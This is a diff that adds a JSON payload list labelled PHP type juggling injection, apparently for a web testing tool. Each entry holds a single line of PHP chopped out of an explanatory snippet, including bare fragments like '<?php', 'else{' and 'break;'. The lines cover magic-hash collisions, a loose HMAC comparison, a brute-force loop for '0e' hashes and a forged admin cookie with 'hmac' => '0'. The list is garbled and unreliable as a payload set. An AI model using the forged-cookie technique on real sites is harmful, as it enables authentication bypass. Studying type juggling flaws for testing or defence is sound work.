@@ -1,0 +1,211 @@
+[
+  {
+    "payload_id": "OWP-37513",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "<?php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37514",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37515",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37516",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37517",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37518",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37519",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "function validate_cookie($cookie,$key){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37520",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "if($cookie['hmac'] != $hash){ // loose comparison",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37521",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "return false;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37522",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "else{",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37523",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "echo \"Well done\";",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37524",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "for($i=1424869663; $i < 1835970773; $i++ ){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37525",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "if(str_starts_with($out, '0e' )){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37526",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "if($out == 0){",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37527",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "echo \"$i - \".$out;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37528",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "break;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37529",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "'username' => 'admin',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37530",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "'expiration' => 1539805986,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37531",
+    "vulnerability_category": "Injection (Type Juggling)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "'hmac' => '0'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
